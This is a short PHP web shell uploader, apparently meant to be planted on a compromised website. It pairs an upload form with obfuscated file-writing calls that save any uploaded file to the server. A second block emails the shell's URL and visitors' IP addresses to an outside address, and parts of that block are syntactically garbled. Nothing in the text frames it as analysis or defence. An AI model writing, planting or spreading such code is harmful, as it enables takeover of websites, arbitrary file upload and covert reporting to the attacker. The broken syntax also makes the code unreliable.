<form method="post" enctype="multipart/form-data"><input type="file" name="uk45"><button>Gaskan</button></form>
<?php
echo base64_decode("cml6a3kwNzxicj4=");
$a = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$b = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$c = "t"."m"."p"."_"."n"."a"."m"."e";
if (isset($_FILES['uk45'])) {$a($_FILES['uk45']['name'], $b($_FILES['uk45'][$c]));if (file_exists("./".$_FILES['uk45']['name'])) {echo "Oke !";} else {echo "Fail !";}}
?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'admin@localfalcon.net';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'^{
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Uwu Ganteng", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'^`. " ]");
?>
